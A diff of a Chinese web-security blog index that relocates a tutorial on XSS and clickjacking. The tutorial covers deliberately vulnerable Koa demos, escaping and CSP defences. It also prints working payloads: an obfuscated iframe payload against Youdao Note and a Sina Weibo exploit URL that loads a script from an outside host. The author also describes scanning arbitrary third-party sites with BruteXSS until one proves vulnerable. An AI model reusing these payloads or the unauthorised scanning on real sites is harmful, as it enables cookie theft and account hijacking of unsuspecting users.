@@ -231,7 +231,7 @@
 </ul>
 <p><code>X-Frame-Options</code> 只是把拦截 <code>iframe</code> 控制权交给了服务端，本质上跟我们之前通过 <code>window.top.location</code> 的效果一样的，它相当于 <code>SAMEORIGIN</code>，因此我们可以通过 JavaScript 也可以达到一样的作用。</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DENY</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span> !== <span class="built_in">window</span>.top)&#123;</span><br><span class="line">    <span class="built_in">window</span>.top.location.href = <span class="built_in">window</span>.location.href;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SAMEORIGIN</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="comment">// 检测是否同域，假如不同域名的情况下访问则会报错</span></span><br><span class="line">  top.location.hostname;</span><br><span class="line">  <span class="comment">// 判断是否被嵌套，假如被嵌套则强制跳转到正常网站地址</span></span><br><span class="line">  <span class="keyword">if</span> (top.location.hostname !== <span class="built_in">window</span>.location.hostname) &#123;</span><br><span class="line">    top.location.href = <span class="built_in">window</span>.location.href;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">  top.location.href = <span class="built_in">window</span>.location.href;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ALLOW-FROM http://test.com</span></span><br><span class="line"><span class="comment">// 只是在上面的基础上加个白名单过滤判断一下就可以了。</span></span><br></pre></td></tr></table></figure>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>iframe</code> 虽然可以做很多事情，也因为历史的车轮逐渐慢慢淘汰，但是不代表点击劫持我们就可以无视，除了 HTTP <code>X-FRAME-OPTIONS</code> 之外，还有 CSP 可以帮助我们拦截点击劫持，这个我们下一次再说。总而言之，能不用<code>iframe</code>  就不用 <code>iframe</code>，同时也要考虑自己的站点允不允许被嵌入防止攻击。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>iframe</code> 虽然可以做很多事情，也因为历史的车轮逐渐慢慢淘汰，但是不代表点击劫持我们就可以无视，除了 HTTP <code>X-FRAME-OPTIONS</code> 之外，还有 <a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">CSP</a> 可以帮助我们拦截点击劫持，这个我们下一次再说。总而言之，能不用<code>iframe</code>  就不用 <code>iframe</code>，同时也要考虑自己的站点允不允许被嵌入防止攻击。</p>
 ]]></content>
       
         <categories>
@@ -625,6 +625,127 @@
 <li><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html" target="_blank" rel="noopener">CSRF 攻击的应对之道</a></li>
 <li><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF" target="_blank" rel="noopener">Cross-Site Request Forgery (CSRF) - OWASP</a>)</li>
 <li><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">浅谈CSRF攻击方式 - hyddd - 博客园</a></li>
+</ul>
+]]></content>
+      
+        <categories>
+            
+            <category> http </category>
+            
+            <category> web-secure </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> http </tag>
+            
+            <tag> web-secure </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Web 安全防御战 - 浅谈XSS]]></title>
+      <url>https://lucius0.github.io/2019/06/30/archivers/web-secure-xss/</url>
+      <content type="html"><![CDATA[<p>在进入 web 安全知识之前，建议对 HTTP 有所了解，可以看<a href="https://lucius0.github.io/2019/06/30/archivers/http-introduction/">HTTP 入门体检</a>，会对以下的内容有所帮助。</p>
+<h2 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS(Cross Site Scripting)"></a>XSS(Cross Site Scripting)</h2><blockquote>
+<p>XSS，跨站脚本攻击。很常见的一种攻击方式，主要是通过<strong>脚本注入</strong>的方式进行攻击用户。通常有：反射型 XSS 、存储型 XSS和 DOM 型 XSS。——<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科</a></p>
+</blockquote>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><blockquote>
+<p>反射型 XSS，为非持久型，可以把它想象成反射弧。从发起带有XSS脚本的请求，提交到服务端，服务端解析后响应随之返回浏览器，最后浏览器将其响应解析并执行。简单来说，一般都是由 URI 参数直接注入的攻击。</p>
+</blockquote>
+<p>我们用 Koa2 来模拟一下，以下是简单的示例代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`welcome: `</span> + ctx.query.xss);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></p>
+<p>在下面我们可以看到，浏览器会报错，原因是现代浏览器都会有 XSS 拦截的保护机制(这并不代表因为浏览器帮我们做了而我们就可以忽略 XSS 的知识)。</p>
+<p><img src="/images/http/xss-01.gif" alt=""></p>
+<p>因此我们需要在服务器设置响应首部<code>X-XSS-Protection</code>。由于我们是要模拟 XSS ，所以我们先关闭 XSS 的保护 <code>ctx.set(&#39;X-XSS-Protection&#39;, 0)</code>，然后就可以看到以下结果，弹出 alert 弹窗。</p>
+<p><img src="/images/http/xss-02.gif" alt=""></p>
+<p>除了上面直接执行脚本之外，还可以加载非同源的js文件，嵌入 iframe 页面等等。</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><blockquote>
+<p> 存储型 XSS，为持久型。跟反射型 XSS 的唯一区别在于是否会保存在服务器，如数据库，内存等。而当别人访问该页面时，就会受到 XSS 代码的攻击。危害相比反射型更加严重，也更隐匿。</p>
+</blockquote>
+<p>我们再次用Koa2来模拟一下，以下是简单的示例代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟数据库</span></span><br><span class="line"><span class="keyword">const</span> database = &#123;</span><br><span class="line">  message: <span class="string">''</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> url = ctx.request.url;</span><br><span class="line">  <span class="keyword">if</span> (url.indexOf(<span class="string">'/blog'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    database.message = ctx.query.message;</span><br><span class="line">    ctx.body = <span class="string">'发送成功～'</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.set(<span class="string">'X-XSS-Protection'</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`来自某某人的消息：`</span> + database.message);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
+<p>大概的步骤是模拟类博客那种，黑客利用漏洞向网站发送带有 XSS 攻击脚本到服务器，服务器没有任何的安全校验直接保存到数据库 <code>database</code>，当其他用户访问带有该 XSS 脚本的页面时就被攻击了。在这里我们发送一个带用 iframe 劫持的请求到服务器，用户收到响应时就会返回该 iframe 页面。</p>
+<p><img src="/images/http/xss-03.gif" alt=""></p>
+<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><blockquote>
+<p>DOM 型 XSS，为非持久型，主要是利用前端的代码逻辑漏洞，攻击者植入恶意代码，然后浏览器解析恶意代码后执行造成的 XSS 攻击。</p>
+</blockquote>
+<p>以下是简单的示例代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  DOM 型 XSS</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="string">'alert(1)'</span>);</span></span><br><span class="line"><span class="javascript">  setInterval(<span class="string">'alert(2)'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="built_in">eval</span>(<span class="string">'alert(3)'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="常见-XSS-注入点"><a href="#常见-XSS-注入点" class="headerlink" title="常见 XSS 注入点"></a>常见 XSS 注入点</h3><ul>
+<li>HTML 节点内容，例如动态生成，里面包含用户输入信息，那么有可能会携带脚本；</li>
+<li>HTML 节点属性，例如图片的 onerror、onclick 事件；超链接 href、输入框 value 属性；</li>
+<li>JavaScript 代码，例如 JS 代码中存在后台注入的变量或如 react 的 dangerouslySetInnerHTML；</li>
+<li>富文本，例如富文本需要过滤需要正常展示的 html 代码之外的脚本；</li>
+</ul>
+<h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul>
+<li>获取页面数据；</li>
+<li>盗取 Cookie，获取敏感信息；</li>
+<li>劫持前端逻辑；</li>
+<li>伪装身份，利用可信任来进行不允许的操作；</li>
+<li>进行 DDoS 攻击；</li>
+<li>……</li>
+</ul>
+<h3 id="常见防御方法"><a href="#常见防御方法" class="headerlink" title="常见防御方法"></a>常见防御方法</h3><ul>
+<li>浏览器自带防御，如我们上面提到的，假如在服务器不设置<code>X-XSS-Protection</code>，现代浏览器也一样会为我们拦截大部分的 XSS 攻击(<strong>反射型 XSS，而且只会拦截出现在 HTML 内容或属性中，同时也并不是所有浏览器都支持</strong>)；</li>
+<li>节点内容转义，一般会在入数据库之前转义或者在展示的时候转义，但是入库之前转义需要<strong>注意的是，1、客户端不仅仅只有Web端，也有iOS等终端，所以可能会导致出现乱码；2、转义后的字符串跟长度跟预期的字符串长度发生变化，如’&lt;‘ 转成 ‘&lt;’，由1个字符变成了4个字符</strong>；</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 展示转义简单处理</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#x27;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2F;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>JavaScript 内容转义，同理节点内容转义，但是处理方法稍微不同，可以使用<code>JSON.stringify</code>来处理；</li>
+<li>Angular / Vue / React，不建议使用 <code>[innerHTML]/v-html/dangerouslySetInnerHTML</code> 来插入 html 元素；</li>
+<li><code>eval()/setTimeout()/setInterval()</code>，都是可以直接将字符串当代码段运行；</li>
+<li>富文本内容转义，相对于节点内容转义跟 JavaScript 内容转义，富文本内容转义比较复杂，但是大多数处理的思路都是相同的，设置转义白名单，对用户输入的内容进行过滤，可以使用 <code>js-xss</code> 库；</li>
+<li>CSP(Content-Security-Policy)，可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a>，关于 CSP 入门教程，可以前往阮一峰老师的博客 - <a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">CSP</a>；</li>
+</ul>
+<p>总体来说，我们能做的只是降低 XSS 攻击的风险，XSS 的攻防战一直存在也十分复杂。最后给一下<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>，祝大家看得开心（溜了～</p>
+<h2 id="实战-amp-amp-案例"><a href="#实战-amp-amp-案例" class="headerlink" title="实战 &amp;&amp; 案例"></a>实战 &amp;&amp; 案例</h2><p>是否你会存在这样的侥幸心理，看完上文后觉得只要进行转义就行了，是的，其实只要进行转义就行了，问题就是从<a href="http://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a>看出，过滤规则表还是蛮多的。我们来简单的实战一下。</p>
+<p>XSS 检测工具有很多，有<strong>BruteXSS</strong>，<strong>XSSer</strong>，<strong>Beef-XSS</strong>等等，可以说靠自己在本地扫描自己本地项目是否存在 XSS 漏洞了。我们在这里用<strong>BruteXSS</strong>来演示一下，<strong>仅做学习，切勿犯法。</strong></p>
+<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><blockquote>
+<p>BruteXSS 是一个根据暴力注入参数的跨站点脚本检测工具，不仅仅支持 GET 请求，还支持 POST 请求。它能从指定的词库中夹在多种 payload 进行注入，并且使用指定的 payload 和扫描检查这些存在的 XSS 漏洞的参数。</p>
+</blockquote>
+<p>我们从 github 下载<a href="https://github.com/Bosco-Lam/BruteXss" target="_blank" rel="noopener">BruteXSS</a>，之所以下载这个是因为它有 wordlist-huge.txt，也就是我们所说的 payload 词库，它约有5000条 payload 脚本。接着我们还需要安装 Python 2.7，<code>pip install colorama</code> 和 <code>pip install Mechanize</code>。</p>
+<p>执行 <code>python brutexss.py</code>，正常情况下会出现以下界面：</p>
+<p><img src="/images/http/xss-04.jpg" alt=""></p>
+<p>接着，搓搓期待的小手，我们可以到处学(sa)习(ye)了。找了好久好不容易才找到一个，于是我们就开始行动，具体的操作在这里就不讲解了，因为一步一步看操作，很简单。我们找的是使用 <code>GET</code> 方法，这类漏洞比较好找，只要对方有输入框即可(现在的浏览器以及网站多多少少都会防御部分XSS，所以不太好找)。</p>
+<p><img src="/images/http/xss-05.png" alt=""></p>
+<p>可以看到参数 <code>q</code> 有一个遗漏的注入点，于是我们就来试试看，是否真的成效。</p>
+<p><img src="/images/http/xss-06.png" alt=""></p>
+<p>(,,#ﾟДﾟ)，没想到居然成了，我试了好多几乎都被后台拦截了，这个居然成了(,,#ﾟДﾟ)。可以看出通过 payload 给出的攻击脚本能顺利的弹出 <code>1</code> 这个框。这个就是典型的<strong>反射型 XSS 攻击。</strong></p>
+<p>除此之外，我们还可以利用该工具在一些破破烂烂的边缘网站发帖来实现<strong>存储型 XSS攻击</strong>。但是这个工具也只是辅助工具，并不代表通过该工具扫描不出的就无漏洞，更多攻击者靠的可是<strong>技术以及经验。</strong></p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><blockquote>
+<p><a href="http://www.wooyun.org" target="_blank" rel="noopener">乌云</a>不在的第三个年头，想它。 ———— 鲁迅</p>
+</blockquote>
+<p>不仅仅是破破烂烂的边缘小网站，也有大公司也存在过 XSS 攻击的案例。</p>
+<h4 id="案例1-有道云笔记分享出现-XSS-攻击漏洞"><a href="#案例1-有道云笔记分享出现-XSS-攻击漏洞" class="headerlink" title="案例1 有道云笔记分享出现 XSS 攻击漏洞"></a>案例1 有道云笔记分享出现 XSS 攻击漏洞</h4><ol>
+<li>编辑完有道云笔记后保存然后通过<strong>Fiddler</strong>或<strong>Charles</strong>进行抓包；</li>
+<li>由于有道云在对 <code>iframe</code> 的 <code>srcdoc</code> 没做处理，因此可以利用这个弱点来进行注入 payload，然后分享给别人，payload 如下；</li>
+<li>修复的方法也很简单，就是对其针对 <code>iframe</code> 的 <code>srcdoc</code> 加强过滤就行了；</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#&lt;iframe class=&amp;quot;&amp;#x7a;&amp;#x68;&amp;#x6f;&amp;#x75;zhou&amp;quot; src='javAscript:confirm(1111)'/1111111wooyun/)"');' href=`vBscript:msgbox('"');` srcdoc='vBscr&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x64;&amp;#x6f;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6e;&amp;#x29;&amp;#x3b;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;ipt:msgbox('"');' alt=`</span><br><span class="line"></span><br><span class="line"><span class="string">` yuyangzhou="&lt;iframe" onclick=eval('&lt;script&gt;alert(/martinzhou/)&lt;/script&gt;'); style=&amp;quot;font-family:e/* &amp;#*/x/*&amp;#x0000000022;*/p/*&amp;gt;*/r/*onkeydown=*/ession(confirm(5));"iframe&gt;zhou&amp;quot;&gt;5&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">`&lt;div class=" \\'" src=&amp;nbsp;javAscript:confirm('1"');&amp;nbsp; href=`</span>data:q;base64,PHNjcmlwdD5hbGVydCgnQHFhYicpPC9zY3JpcHQ+<span class="string">` srcdoc= javAscript:confirm('1"');  alt="zhou" yuyangzhou=`</span><span class="string">`&lt;div/onmouseover=prompt(1)`</span> onload=alert(<span class="string">'1"'</span>); style=&amp;nbsp;font-family:e<span class="comment">/*;/*/</span>x<span class="comment">/*&amp;#34;*/</span>p<span class="comment">/*&amp;quot;*/</span>r<span class="comment">/*onclick=*/</span>ession(confirm(<span class="number">0</span>));<span class="string">""</span><span class="string">`&lt;div/onmouseover=prompt(1)&amp;nbsp;&gt;0&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="案例2-新浪微博反射型-XSS"><a href="#案例2-新浪微博反射型-XSS" class="headerlink" title="案例2 新浪微博反射型 XSS"></a>案例2 新浪微博反射型 XSS</h4><ol>
+<li>在新浪微博某个分享页，有这样的一个接口<code>http://book.weibo.com/newcms/i/weibo_send.php</code>；</li>
+<li><p>当错误时返回的数据结构为如下；</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 也就是说这个接口会校验`error.referer`</span></span><br><span class="line">&#123;<span class="string">"code"</span>:<span class="number">-1</span>,<span class="string">"message"</span>:<span class="string">"\u8bf7\u6c42\u6e90\u4e0d\u5141\u8bb8[http:\/\/error.referer]"</span>&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当<code>error.referer</code>返回来后页面的响应报文为<code>Content-Type: text/html; charset=utf-8</code>，既然错误后的<code>Content-Type</code>为<code>text/html</code>，那么我们就可以在此做文章；</p>
+</li>
+<li>虽然在 Chrome 和 Firefox 下，referrer 都会被进行 url encode导致无法插入HTML标签。<strong>但是该问题，可以在 IE 进行 XSS 攻击；</strong></li>
+<li><p>我们在自己的服务器做一些处理，向我们服务器发起请求，即在浏览器地址栏输入如下 URL；</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e=document.createElement("script");e.src="http://a.xxx.xyz/book.weibo.js",document.documentElement.appendChild(e)</span></span><br><span class="line"><span class="comment">// 将上面的转换为 char code 的形式</span></span><br><span class="line"><span class="comment">// 完整 URL 如下</span></span><br><span class="line">http:<span class="comment">//a.xxx.xyz/?a=&lt;img src=1 onerror=eval(String.fromCharCode(101,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,101,46,115,114,99,61,34,104,116,116,112,58,47,47,97,46,122,104,99,104,98,105,110,46,120,121,122,47,98,111,111,107,46,119,101,105,98,111,46,106,115,34,44,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,97,112,112,101,110,100,67,104,105,108,100,40,101,41))&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>请求后我们的服务器会重定向跳转到<code>http://book.weibo.com/newcms/i/weibo_send.php</code>，这时候的 <code>error.referer</code> 就会被我们植入 XSS 攻击脚本了。</p>
+</li>
+</ol>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>可以看到，大多数漏洞都是处于绕来绕去最后发现漏洞的地方没有进行过滤转义处理。正所谓 <strong>攻击千万条，安全第一条。过滤不规范，开发两行泪。</strong></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科，自由的百科全书</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting" target="_blank" rel="noopener">跨站脚本攻击(Cross-site scripting) - 术语表 | MDN</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a></li>
+<li><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS" target="_blank" rel="noopener">Cross-site Scripting (XSS)</a>)</li>
 </ul>
 ]]></content>
       
@@ -1098,127 +1219,6 @@
         <tags>
             
             <tag> http </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Web 安全防御战 - 浅谈XSS]]></title>
-      <url>https://lucius0.github.io/2019/06/30/archivers/web-secure-xss/</url>
-      <content type="html"><![CDATA[<p>在进入 web 安全知识之前，建议对 HTTP 有所了解，可以看<a href="https://lucius0.github.io/2019/06/30/archivers/http-introduction/">HTTP 入门体检</a>，会对以下的内容有所帮助。</p>
-<h2 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS(Cross Site Scripting)"></a>XSS(Cross Site Scripting)</h2><blockquote>
-<p>XSS，跨站脚本攻击。很常见的一种攻击方式，主要是通过<strong>脚本注入</strong>的方式进行攻击用户。通常有：反射型 XSS 、存储型 XSS和 DOM 型 XSS。——<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科</a></p>
-</blockquote>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><blockquote>
-<p>反射型 XSS，为非持久型，可以把它想象成反射弧。从发起带有XSS脚本的请求，提交到服务端，服务端解析后响应随之返回浏览器，最后浏览器将其响应解析并执行。简单来说，一般都是由 URI 参数直接注入的攻击。</p>
-</blockquote>
-<p>我们用 Koa2 来模拟一下，以下是简单的示例代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span 